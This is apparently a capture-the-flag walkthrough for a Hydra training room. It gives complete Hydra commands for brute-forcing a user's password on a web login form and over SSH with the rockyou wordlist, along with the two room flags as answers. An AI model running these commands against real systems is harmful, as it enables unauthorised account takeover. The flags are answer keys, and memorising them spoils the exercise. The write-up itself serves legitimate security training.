# Hydra

Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

## Using Hydra

    1. Use Hydra to bruteforce molly's web password. What is flag 1?
        a.  THM{2673a7dd116de68e85c48ec0b1f2612e} - hydra -l molly -P /usr/share/wordlists/rockyou.txt <ipaddress> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 
    2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
        a. THM{c8eeb0468febbadea859baeb33b2541b} - Using the command 'hydra -l molly -P /usr/share/wordlists/rockyou.txt <ipaddress> -t 4 ssh ' the password was brute forced. I then was able to use the command 'ssh molly@ipaddress followed by the password that was found to login and locate the flat in the home directory. Then it was as simple as using 'cat flag2.txt' to display the flag.
